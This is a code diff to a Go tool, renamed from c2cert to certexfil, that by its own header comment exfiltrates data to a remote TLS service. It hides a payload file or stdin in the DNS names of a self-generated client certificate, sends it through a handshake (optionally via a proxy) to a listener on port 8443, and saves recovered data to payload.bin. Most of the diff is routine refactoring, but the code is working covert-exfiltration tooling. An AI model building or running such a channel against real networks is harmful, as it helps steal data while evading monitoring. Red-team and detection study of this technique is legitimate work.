@@ -1,9 +1,10 @@
-// c2cert provides CA certs and can be used to exfiltrate data to a remote TLS service.
+// certexfil provides CA certs and can be used to exfiltrate data to a remote TLS service.
 // @Sourcefrenchy
 package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/ecdsa"
 	"crypto/elliptic"
 	"crypto/rand"
@@ -27,13 +28,11 @@ import (
 	"time"
 )
 
-// DEBUG is used for verbose logging
-var DEBUG = true
-
 // tlsPort is used for listener (all interface) on your remote server
 var tlsPort = "8443"
 
 var (
+	debug      = flag.Bool("debug", false, "Debug mode to print out more information")
 	listen     = flag.Bool("listen", false, "Start your TLS listener and wait for payload.")
 	host       = flag.String("host", "", "Comma-separated hostnames and IPs to generate a certificate for")
 	proxy      = flag.String("proxy", "", "proxy info formatted as http://user:pwd@proxy:port")
@@ -43,19 +42,35 @@ var (
 	rsaBits    = flag.Int("rsa-bits", 2048, "Size of RSA key to generate. Ignored if --ecdsa-curve is set")
 	ecdsaCurve = flag.String("ecdsa-curve", "P521", "ECDSA curve to use to generate a key. Valid values are P224, P256 (recommended), P384, P521")
 	payload    = flag.String("payload", "", "Indicate the file to embed. Use - for stdin.")
+	outfile    = flag.Bool("outfile", false, "save payload received to payload.bin")
 )
+
+var DEBUG = *debug
 
 func rootHandler(w http.ResponseWriter, r *http.Request) {
 	// Write "Oo" to the response body
-	io.WriteString(w, "Oo\n")
-	tls := r.TLS
-	certs := tls.PeerCertificates
+	if _, err := io.WriteString(w, "Oo"); err != nil {
+		log.Fatal(err)
+	}
+	certs := r.TLS.PeerCertificates
 
 	if len(certs) > 0 {
 		if DEBUG {
 			log.Printf("[*] Payload received: %s", certs[0].DNSNames[1])
 		}
-		cryptopayload.Retrieve(certs[0].DNSNames[1])
+		payload := cryptopayload.Retrieve(certs[0].DNSNames[1])
+		if *outfile == true {
+			log.Println("[D] outfile = true")
+			out, err := os.Create("payload.bin")
+			if err != nil {
+				// panic?
+			}
+			defer out.Close()
+			bReader := bytes.NewReader([]byte(payload))
+			if _, err := io.Copy(out, bReader); err != nil {
+				log.Fatal(err)
+			}
+		}
 	}
 }
 
@@ -73,12 +88,10 @@ func tlsListen() {
 		MinVersion: tls.VersionTLS12,
 		ClientCAs:  caCertPool,
 		//      ClientAuth:               tls.RequireAndVerifyClientCert,
-		ClientAuth:               tls.RequestClientCert,
-		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
-		PreferServerCipherSuites: true,
+		ClientAuth:       tls.RequestClientCert,
+		CurvePreferences: []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
 	}
 	log.Println("[*] Starting listener...")
-	tlsConfig.BuildNameToCertificate()
 
 	// Create a Server instance to listen on port 8443 with the TLS config
 	server := &http.Server{
@@ -87,17 +100,17 @@ func tlsListen() {
 		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
 	}
 
-	// Set up a /c2cert resource handler
+	// Set up /c2cert resource handler
 	http.HandleFunc("/c2cert", rootHandler)
 	// Listen to HTTPS connections with the server certificate and wait
-	serr := server.ListenAndServeTLS("./CERTS/server_cert.pem", "./CERTS/server_key.pem")
-	if serr != nil {
-		log.Fatal("ListenAndServe: ", serr)
+	err = server.ListenAndServeTLS("./CERTS/server_cert.pem", "./CERTS/server_key.pem")
+	if err != nil {
+		log.Fatal("ListenAndServe: ", err)
 	}
 }
 
-func publicKey(priv interface{}) interface{} {
-	switch k := priv.(type) {
+func publicKey(private interface{}) interface{} {
+	switch k := private.(type) {
 	case *rsa.PrivateKey:
 		return &k.PublicKey
 	case *ecdsa.PrivateKey:
@@ -107,8 +120,8 @@ func publicKey(priv interface{}) interface{} {
 	}
 }
 
-func pemBlockForKey(priv interface{}) *pem.Block {
-	switch k := priv.(type) {
+func pemBlockForKey(private interface{}) *pem.Block {
+	switch k := private.(type) {
 	case *rsa.PrivateKey:
 		return &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(k)}
 	case *ecdsa.PrivateKey:
@@ -124,7 +137,7 @@ func pemBlockForKey(priv interface{}) *pem.Block {
 }
 
 // tlsConnect main section
-func tlsConnect(payloadDat string, host string) {
+func tlsConnect(host string) {
 	// Read the key pair to create certificate
 	cert, err := tls.LoadX509KeyPair("./CERTS/client_cert.pem", "./CERTS/client_key.pem")
 	if err != nil {
@@ -146,8 +159,8 @@ func tlsConnect(payloadDat string, host string) {
 		},
 	}
 
-	// Create a HTTPS client and supply the created CA pool and certificate
-	// proxyStr := "http://usera:w00tw00t@127.0.0.1:3128"
+	// Create HTTPS client and supply the created CA pool and certificate
+	// proxyStr := "http://user:w00tw00t@127.0.0.1:3128"
 	if len(*proxy) != 0 {
 		u, err := url.Parse(*proxy)
 		if err != nil {
@@ -168,22 +181,7 @@ func tlsConnect(payloadDat string, host string) {
 		fmt.Printf("[!] Proxy issues: \n\t")
 		log.Fatal(err)
 	}
-
-	// if !strings.Contains(string(client.status), "200 OK") {
-	// 	log.Fatalf("[!] Issues connect to the proxy, check proxy information.")
-	// }
-
-	// Read the response body
-	defer r.Body.Close()
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	if DEBUG {
-		// Print the response body to stdout
-		fmt.Printf("%s\n", body)
-	}
+	r.Body.Close()
 }
 
 func main() {
@@ -196,18 +194,18 @@ func main() {
 		if len(*host) == 0 {
 			log.Fatalf("[!] Missing required --host parameter")
 		}
-		var priv interface{}
+		var private interface{}
 		switch *ecdsaCurve {
 		case "":
-			priv, err = rsa.GenerateKey(rand.Reader, *rsaBits)
+			private, err = rsa.GenerateKey(rand.Reader, *rsaBits)
 		case "P224":
-			priv, err = ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
+			private, err = ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
 		case "P256":
-			priv, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+			private, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
 		case "P384":
-			priv, err = ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
+			private, err = ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
 		case "P521":
-			priv, err = ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
+			private, err = ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
 		default:
 			fmt.Fprintf(os.Stderr, "[!] Unrecognized elliptic curve: %q", *ecdsaCurve)
 			os.Exit(1)
@@ -217,7 +215,10 @@ func main() {
 		}
 
 		if _, err := os.Stat("./CERTS"); os.IsNotExist(err) {
-			os.Mkdir("./CERTS", 0700)
+			err = os.Mkdir("./CERTS", 0700)
+			if err != nil && !os.IsExist(err) {
+				log.Println(err)
+			}
 		}
 
 		var notBefore time.Time
@@ -308,7 +309,7 @@ func main() {
 			certPrefix = "./CERTS/client_"
 		}
 
-		derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, publicKey(priv), priv)
+		derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, publicKey(private), private)
 		if err != nil {
 			log.Fatalf("[!] Failed to create certificate: %s", err)
 		}
@@ -331,7 +332,7 @@ func main() {
 			log.Print("[!] failed to open cert key for writing:", err)
 			return
 		}
-		if err := pem.Encode(keyOut, pemBlockForKey(priv)); err != nil {
+		if err := pem.Encode(keyOut, pemBlockForKey(private)); err != nil {
 			log.Fatalf("[!] failed to write data to cert key: %s", err)
 		}
 		if err := keyOut.Close(); err != nil {
@@ -339,7 +340,7 @@ func main() {
 		}
 
 		if *isCA == false {
-			tlsConnect(payloadDat, *host)
+			tlsConnect(*host)
 		}
 	}
 }
